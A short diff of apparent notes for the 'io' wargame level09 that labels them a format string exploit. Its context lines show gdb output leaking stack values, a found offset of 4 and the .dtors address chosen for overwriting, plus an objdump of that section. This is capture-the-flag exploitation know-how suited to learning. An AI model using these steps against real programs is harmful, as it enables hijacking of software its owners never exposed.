@@ -1,3 +1,5 @@
+
+/* format string exploit */
 #include <stdio.h>
 #include <string.h>
 
@@ -43,7 +45,7 @@ AAAA[bffffe4f][000003ff][0015ed7c][41414141][3830255b][255b5d78][5d783830][38302
 (gdb) 
 
 offset = 4
-写入地址dtors  addr : 0x080494d0 + 4 = 0x080494d4
+写入地址dtors  addr : 0x080494d0 + 4 = 0x080494d4 
 level9@io:/levels$ objdump -s -j .dtors level09
 
 level09:     file format elf32-i386
